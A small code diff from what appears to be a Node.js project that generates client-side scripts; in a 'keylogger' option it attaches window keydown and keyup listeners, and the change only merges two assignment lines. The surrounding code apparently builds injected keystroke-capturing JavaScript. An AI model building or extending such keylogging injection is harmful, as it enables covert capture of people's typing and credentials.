@@ -966,8 +966,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 			if (keylogger) {
 				variables += 'm = {}, f = [], g = new Date().getTime(),'
 				header += comment("add listeners to the window for keydown & keyup events") + `
-					k.onkeydown = b
-					k.onkeyup = b
+					k.onkeydown = k.onkeyup = b
 				`
 				body += `
 					function b(n) {` + comment("if the key type ends with p => then it's keyup") + `
